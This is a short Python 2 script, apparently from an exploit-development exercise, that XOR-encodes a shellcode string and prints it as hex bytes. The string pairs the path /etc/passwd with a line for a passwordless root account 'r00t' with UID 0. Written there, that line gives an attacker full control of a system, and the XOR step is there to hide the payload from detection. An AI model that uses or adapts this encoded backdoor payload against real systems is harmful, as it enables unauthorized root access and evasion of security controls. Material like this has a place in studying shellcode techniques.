#!/usr/bin/python

import random

shellcode = "/etc/passwdXXXXr00t::0:0:::"

encoded = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode):
	y = x ^ 0xDE
	encoded += '0x%02x,' %y

print encoded

